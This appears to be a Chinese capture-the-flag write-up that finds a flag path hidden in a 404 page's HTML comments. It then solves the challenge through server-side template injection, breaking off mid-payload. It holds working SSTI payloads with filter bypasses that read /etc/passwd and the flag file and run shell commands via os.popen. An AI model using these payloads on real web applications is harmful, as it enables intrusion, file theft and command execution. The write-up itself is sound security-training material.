404界面里面还可以藏东西（第一次见）

打开view-source:http://61.147.171.105:50385/register.php

然后发现是

```html

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /register.php was not found on this server.</p>
<hr>
<address>Apache/2.4.10 (Debian) Server at 61.147.171.105 Port 50385</address>
</body></html>
<!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt-->
<!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt-->
	
```

这里暴露了flag的位置（也算是一个hint）

然后就是ssti的那一套（最常用的被禁用了）

payload：

```php
http://61.147.171.105:50385/login.php/{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read
```

即可获取flag

这里的构造

request有两种形式，`request.args`和`request.values`，当args被过滤时我们可以使用values，且这种方法POST和GET传递的数据都可以被接收，相对于通过`chr()`进行绕过，这种方法更为简单和便捷。

```
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

构造后为

```
{{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request
```

